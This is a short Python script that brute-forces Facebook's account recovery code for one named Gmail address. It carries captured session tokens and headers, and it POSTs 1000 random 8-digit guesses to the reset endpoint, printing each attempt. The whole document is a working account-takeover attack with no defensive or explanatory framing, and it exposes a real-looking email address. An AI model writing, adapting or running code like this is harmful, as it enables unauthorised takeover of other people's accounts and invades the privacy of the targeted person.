import requests
import random

# Define the URL and headers
url = 'https://www.facebook.com/recover/code/?em%5B0%5D=msnrsmart1%40gmail.com&rm=send_email&spc=0&cuid=AYjFdz3rfvF5r_4iZ73io70UKdp7g746x_Q-VdzHUuTfu0Jzx0B4A1etV_QXzOHB-_WYRLxEf5_bQYzajpTv3yfwdJ-yEMmKbFLFru_QtSre0DlnwjRXlE2xFOjmmzuv-efEYU144fmHyvQ6txO-h_-aVe3ysnr5nAaKSvZFQ19ZL933hOLmBLQHGSGNf3effAY&fl=default_recover&wsr=0'
headers = {
    'Host': 'www.facebook.com',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.88 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Origin': 'https://www.facebook.com',
    'Dnt': '1',
    'Upgrade-Insecure-Requests': '1',
    'Referer': 'https://www.facebook.com/recover/code/?em[0]=msnrsmart1%40gmail.com&rm=send_email&cuid=AYjFdz3rfvF5r_4iZ73io70UKdp7g746x_Q-VdzHUuTfu0Jzx0B4A1etV_QXzOHB-_WYRLxEf5_bQYzajpTv3yfwdJ-yEMmKbFLFru_QtSre0DlnwjRXlE2xFOjmmzuv-efEYU144fmHyvQ6txO-h_-aVe3ysnr5nAaKSvZFQ19ZL933hOLmBLQHGSGNf3effAY&lara=1&hash=AUao8IyEWs7BQwfqjSs',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
}

# Loop to try 1000 random 8-digit numeric passwords
for _ in range(1000):
    # Generate a random 8-digit number
    password = str(random.randint(10000000, 99999999))

    payload = {
        'jazoest': '2917',
        'lsd': 'AVoJ0HJVRhs',
        'n': password,
        'reset_action': '1'
    }
    
    # Make the POST request
    response = requests.post(url, headers=headers, data=payload)
    
    # Print the response (you may want to log this instead)
    print(f"Trying password: {password} - Status code: {response.status_code}")
